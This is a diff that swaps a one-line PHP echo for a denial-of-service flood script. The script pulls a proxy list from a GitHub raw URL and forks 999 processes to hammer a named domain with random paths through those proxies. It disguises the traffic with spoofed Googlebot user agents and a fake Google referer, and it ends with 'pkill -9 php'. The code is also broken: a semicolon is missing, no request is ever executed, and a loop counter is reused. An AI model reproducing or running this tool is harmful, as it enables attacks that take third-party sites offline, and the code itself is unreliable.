@@ -1,1 +1,118 @@
-echo "slsweb";
+set_time_limit(30);
+function generateRandomString($length=10) {
+    $original_string = array_merge(range(0,9), range('a','z'), range('A', 'Z'));
+    $original_string = implode("", $original_string);
+    return substr(str_shuffle($original_string), 0, $length);
+}
+function getRandomUserAgent(){
+    $userAgents=array(
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",   
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",   
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",   
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",   
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",   
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",   
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",   
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",   
+        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",   
+        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",   
+        "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+    );
+    $random = rand(0,count($userAgents)-1);
+    return $userAgents[$random];
+}
+function partition($list, $p)
+{
+    $listlen   = count($list);
+    $partlen   = floor($listlen / $p);
+    $partrem   = $listlen % $p;
+    $partition = array();
+    $mark      = 0;
+    for ($px = 0; $px < $p; $px++) {
+        $incr           = ($px < $partrem) ? $partlen + 1 : $partlen;
+        $partition[$px] = array_slice($list, $mark, $incr);
+        $mark += $incr;
+    }
+    return $partition;
+}
+$part        = array();
+$array       = file("https://raw.githubusercontent.com/webr00t/web/master/p.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$total_lines = count($array);
+$childcount  = 999;
+$part        = partition($array, $childcount);
+
+$shm_id = shmop_open(23377332, "c", 0666, 1024);
+shmop_close($shm_id);
+$exec_time = "30"
+$time = time();
+$max_time = $time+$exec_time;
+for ($i = 0; $i < $childcount; $i++) {
+    $pid = pcntl_fork();
+    if ($pid == -1) {
+        echo "failed to fork on loop $i of forking\n";
+        exit;
+    } else if ($pid) {
+        continue;
+    } else {
+        $sem    = sem_get(13377331, 1, 0666, 1);
+        $shm_id = shmop_open(23377332, "c", 0666, 1024);
+        while (true) {
+            $results = count($part[$i]);
+            $r       = 0;
+            foreach ($part[$i] as $line) {
+				if(time() > $max_time){
+				break;
+				}
+                if ($r > $results) {
+                    break;
+                }
+                $r++;
+				for($i=0;$i<500;$i++){
+                $ch         = curl_init();
+				$rand = generateRandomString(20);
+                $curlConfig = array(
+                    CURLOPT_URL => "http://www.upr7.com/$rand",
+                    CURLOPT_RETURNTRANSFER => 1,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_USERAGENT => getRandomUserAgent(),
+                    CURLOPT_REFERER => "https://www.google.com.tr/",
+                    CURLOPT_PROXY => $line,
+                    CURLOPT_FOLLOWLOCATION => 1,
+                    CURLOPT_TIMEOUT => 1,
+                    CURLOPT_CONNECTTIMEOUT => 1
+                );
+                curl_setopt_array($ch, $curlConfig);
+                curl_close($ch);
+				}
+                sem_acquire($sem);
+                $number = shmop_read($shm_id, 0, 1024);
+                $number = intval($number);
+                $number++;
+                shmop_write($shm_id, str_pad($number, 1024, "\0"), 0);
+                sem_release($sem);
+            }
+        }
+        die;
+    }
+}
+
+$sem    = sem_get(13377331, 1, 0666, 1);
+$shm_id = shmop_open(23377332, "c", 0666, 1024);
+$total  = 0;
+while (true) {
+    sem_acquire($sem);
+    $number = shmop_read($shm_id, 0, 1024);
+    $total += $number;
+    shmop_write($shm_id, str_pad("0", 1024, "\0"), 0);
+    sem_release($sem);
+    sleep(1);
+    if ($total_lines < $total) {
+        shell_exec('pkill -9 php');
+        echo "Done\n";
+    }
+}
+
+for ($j = 0; $j < $childcount; $j++) {
+    $pid = pcntl_wait($status);
+}
